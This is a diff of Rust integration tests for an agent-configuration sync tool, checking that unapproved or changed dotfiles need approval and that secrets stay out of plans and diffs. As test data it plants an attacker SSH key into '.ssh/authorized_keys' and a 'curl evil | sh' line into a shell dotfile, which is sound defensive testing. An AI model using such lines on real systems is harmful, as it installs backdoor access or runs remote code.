@@ -28,12 +28,9 @@ fn init_and_seed(env: &MusterEnv, extra_manifest: &str) {
 
     let cfg = env.config_dir();
     std::fs::write(cfg.join("AGENTS.md"), "# Shared rules\n\nBe concise.\n").expect("AGENTS.md");
-    std::fs::write(
-        cfg.join("muster.toml"),
-        format!(
-            r#"
-version = 1
-
+    let mut text = std::fs::read_to_string(cfg.join("muster.toml")).unwrap();
+    text.push_str(&format!(
+        r#"
 [agents]
 enabled = ["claude"]
 
@@ -48,9 +45,8 @@ args = ["-y", "@modelcontextprotocol/server-github"]
 [mcp.github.env]
 GITHUB_TOKEN = "native://tokens/github"
 "#
-        ),
-    )
-    .expect("write manifest");
+    ));
+    std::fs::write(cfg.join("muster.toml"), text).expect("write manifest");
 
     // The vault group holding the secret value the ref points at.
     let secret_value = "ghp_SUPERSECRETVALUE0123456789";
@@ -299,30 +295,15 @@ fn new_hook_without_approval_is_not_installed_non_tty_fails_exit_2() {
 
     // Declare a NEW hook in the manifest.
     let cfg = env.config_dir();
-    std::fs::write(
-        cfg.join("muster.toml"),
+    let mut text = std::fs::read_to_string(cfg.join("muster.toml")).unwrap();
+    text.push_str(
         r#"
-version = 1
-
-[agents]
-enabled = ["claude"]
-
-[agents.instructions]
-source = "AGENTS.md"
-
 [agents.hooks.pre_tool_use]
 command = "/bin/echo hook-ran"
 matcher = "Bash"
-
-[mcp.github]
-command = "npx"
-args = ["-y", "@modelcontextprotocol/server-github"]
-
-[mcp.github.env]
-GITHUB_TOKEN = "native://tokens/github"
 "#,
-    )
-    .expect("manifest with new hook");
+    );
+    std::fs::write(cfg.join("muster.toml"), text).expect("manifest with new hook");
 
     // No TTY and no --yes: must refuse with exit code 2 (confirmation required).
     let (out, envelope) = all_json(&env, &["sync"]);
@@ -545,11 +526,9 @@ fn removed_mcp_server_is_pruned_but_user_servers_are_kept() {
 
     // github is no longer declared.
     let cfg = env.config_dir();
-    std::fs::write(
-        cfg.join("muster.toml"),
-        "version = 1\n\n[agents]\nenabled = [\"claude\"]\n\n[agents.instructions]\nsource = \"AGENTS.md\"\n",
-    )
-    .expect("manifest without github");
+    let text = std::fs::read_to_string(cfg.join("muster.toml")).unwrap();
+    let text = text.split("[mcp.github]").next().unwrap();
+    std::fs::write(cfg.join("muster.toml"), text).expect("manifest without github");
 
     let (out, envelope) = all_json(&env, &["sync", "--yes"]);
     assert!(out.status.success(), "{}", envelope.raw);
@@ -620,4 +599,213 @@ fn sync_adopts_a_dotfiles_symlink_instead_of_failing_and_warns() {
             .is_some_and(|m| m.contains("../.agents/AGENTS.md")),
         "the warning names the old link target: {warning}"
     );
+}
+
+// ---------------------------------------------------------------------------
+// 6. Managed dotfiles are executable-adjacent: they need approval too
+// ---------------------------------------------------------------------------
+
+fn declare_dotfile(env: &MusterEnv, target: &str, body: &str) {
+    let cfg = env.config_dir();
+    std::fs::create_dir_all(cfg.join("files")).expect("files dir");
+    std::fs::write(cfg.join("files/payload"), body).expect("payload");
+    let manifest = std::fs::read_to_string(cfg.join("muster.toml")).expect("manifest");
+    let manifest = manifest.split("\n[files.").next().unwrap().to_owned();
+    std::fs::write(
+        cfg.join("muster.toml"),
+        format!("{manifest}\n[files.\"{target}\"]\nsource = \"files/payload\"\n"),
+    )
+    .expect("manifest with dotfile");
+}
+
+#[test]
+fn unapproved_dotfile_is_not_applied_unattended() {
+    let env = MusterEnv::new();
+    init_and_seed(&env, "");
+    all_json(&env, &["sync", "--yes"]);
+    declare_dotfile(&env, ".ssh/authorized_keys", "ssh-ed25519 AAAAattacker\n");
+
+    let (out, _e) = all_json(&env, &["sync"]);
+    assert_eq!(out.status.code(), Some(2), "{}", stdout_of(&out));
+    assert!(!env.path().join(".ssh/authorized_keys").exists());
+
+    let (plan, _p) = all_json(&env, &["plan"]);
+    assert!(
+        stdout_of(&plan).contains("\"dotfile\""),
+        "{}",
+        stdout_of(&plan)
+    );
+}
+
+#[test]
+fn approved_dotfile_applies_and_does_not_reprompt_until_content_changes() {
+    let env = MusterEnv::new();
+    init_and_seed(&env, "");
+    declare_dotfile(&env, ".bashrc-muster", "echo one\n");
+    let (out, _e) = all_json(&env, &["sync", "--yes"]);
+    assert!(out.status.success(), "{}", stdout_of(&out));
+    assert_eq!(
+        std::fs::read_to_string(env.path().join(".bashrc-muster")).unwrap(),
+        "echo one\n"
+    );
+
+    // Unchanged: unattended sync is fine.
+    let (out, _e) = all_json(&env, &["sync"]);
+    assert!(out.status.success(), "{}", stdout_of(&out));
+
+    // Content changed remotely: needs approval again.
+    declare_dotfile(&env, ".bashrc-muster", "curl evil | sh\n");
+    let (out, _e) = all_json(&env, &["sync"]);
+    assert_eq!(out.status.code(), Some(2), "{}", stdout_of(&out));
+    assert_eq!(
+        std::fs::read_to_string(env.path().join(".bashrc-muster")).unwrap(),
+        "echo one\n"
+    );
+}
+
+// ---------------------------------------------------------------------------
+// 7. Escaped serializations of a secret never reach plans or diffs
+// ---------------------------------------------------------------------------
+
+#[test]
+fn plan_and_sync_hide_json_and_toml_escaped_secret_forms() {
+    use std::os::unix::fs::PermissionsExt;
+    let env = MusterEnv::new();
+    env.run(&["--format", "json", "--yes", "init"])
+        .assert()
+        .code(0);
+    std::fs::write(env.config_dir().join("AGENTS.md"), "# Rules\n").unwrap();
+    let mut text = std::fs::read_to_string(env.config_dir().join("muster.toml")).unwrap();
+    text.push_str(
+        r#"
+[agents]
+enabled = ["claude", "codex"]
+
+[agents.instructions]
+source = "AGENTS.md"
+
+[secrets."env://TRICKY"]
+allow = ["claude", "codex"]
+
+[mcp.tricky]
+command = "tricky-mcp"
+env = { KEY = "env://TRICKY" }
+"#,
+    );
+    std::fs::write(env.config_dir().join("muster.toml"), text).unwrap();
+    env.run(&["trust", "resign", "--yes"]).assert().success();
+
+    let secret = "pa\"ss\\w\nor\td-\u{e9}\u{20ac}-tail";
+    let forms = [
+        secret.to_owned(),
+        serde_json::to_string(secret)
+            .unwrap()
+            .trim_matches('"')
+            .to_owned(),
+        secret
+            .replace('\\', "\\\\")
+            .replace('"', "\\\"")
+            .replace('\n', "\\n")
+            .replace('\t', "\\t"),
+    ];
+    for (verb, args) in [("plan", vec!["plan"]), ("sync", vec!["sync", "--yes"])] {
+        let mut full = vec!["--format", "json"];
+        full.extend(args);
+        let out = env.run(&full).env("TRICKY", secret).output().unwrap();
+        assert!(out.status.success(), "{verb}: {}", stdout_of(&out));
+        let text = format!("{}{}", stdout_of(&out), stderr_of(&out));
+        for form in &forms {
+            assert!(
+                !text.contains(form.as_str()),
+                "{verb} leaked {form:?}:\n{text}"
+            );
+        }
+        // Distinctive fragments survive any one escaping scheme.
+        assert!(
+            !text.contains("d-\u{e9}\u{20ac}-tail"),
+            "{verb} leaked tail"
+        );
+    }
+    for file in [".claude.json", ".codex/config.toml"] {
+        let path = env.path().join(file);
+        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600, "{file} must stay private");
+    }
+}
+
+fn assert_no_content_lines(diff: &str) {
+    for line in diff.lines().skip(2) {
+        assert!(
+            !line.starts_with(['+', '-', ' ']),
+            "private diff shows a content line: {line:?} in {diff}"
+        );
+    }
+}
+
+#[test]
+fn private_file_diff_suppression_never_reveals_secret_context_or_additions() {
+    let env = MusterEnv::new();
+    env.run(&["--format", "json", "--yes", "init"])
+        .assert()
+        .code(0);
+    std::fs::write(
+        env.config_dir().join("AGENTS.md"),
+        "# Rules
+",
+    )
+    .unwrap();
+    let mut text = std::fs::read_to_string(env.config_dir().join("muster.toml")).unwrap();
+    text.push_str(
+        r#"
+[agents]
+enabled = ["claude"]
+
+[agents.instructions]
+source = "AGENTS.md"
+
+[mcp.demo]
+command = "demo-server"
+env = { SECRET = "env://DEMO_SECRET" }
+"#,
+    );
+    std::fs::write(env.config_dir().join("muster.toml"), text).unwrap();
+    env.run(&["trust", "resign", "--yes"]).assert().success();
+
+    // 1. Plan for initial addition: private agent file (.claude.json / settings)
+    let (plan_out, plan_env) = all_json(&env, &["plan"]);
+    assert!(plan_out.status.success());
+    let raw = plan_env.raw;
+    let files = raw["result"]["agents"][0]["files"].as_array().unwrap();
+    let private_file = files
+        .iter()
+        .find(|f| f["private"] == true)
+        .expect("has private file");
+    let diff = private_file["diff"].as_str().unwrap();
+    assert!(diff.contains("<private file added>"), "diff: {diff}");
+    assert!(!diff.contains("DEMO_SECRET"), "diff: {diff}");
+    assert_no_content_lines(diff);
+
+    // Apply first
+    let (sync_out, _) = all_json(&env, &["sync", "--yes"]);
+    assert!(sync_out.status.success());
+
+    // 2. Modify private file: add another environment variable
+    let mut text2 = std::fs::read_to_string(env.config_dir().join("muster.toml")).unwrap();
+    text2 = text2.replace("demo-server", "sensitive-addition");
+    std::fs::write(env.config_dir().join("muster.toml"), text2).unwrap();
+    env.run(&["trust", "resign", "--yes"]).assert().success();
+
+    let (plan2_out, plan2_env) = all_json(&env, &["plan"]);
+    assert!(plan2_out.status.success());
+    let raw2 = plan2_env.raw;
+    let files2 = raw2["result"]["agents"][0]["files"].as_array().unwrap();
+    let private_file2 = files2
+        .iter()
+        .find(|f| f["private"] == true && f["changed"] == true)
+        .expect("has modified private file");
+    let diff2 = private_file2["diff"].as_str().unwrap();
+    assert!(diff2.contains("<private file modified>"), "diff: {diff2}");
+    assert!(!diff2.contains("sensitive-addition"), "diff: {diff2}");
+    assert!(!diff2.contains("demo-server"), "diff: {diff2}");
+    assert_no_content_lines(diff2);
 }
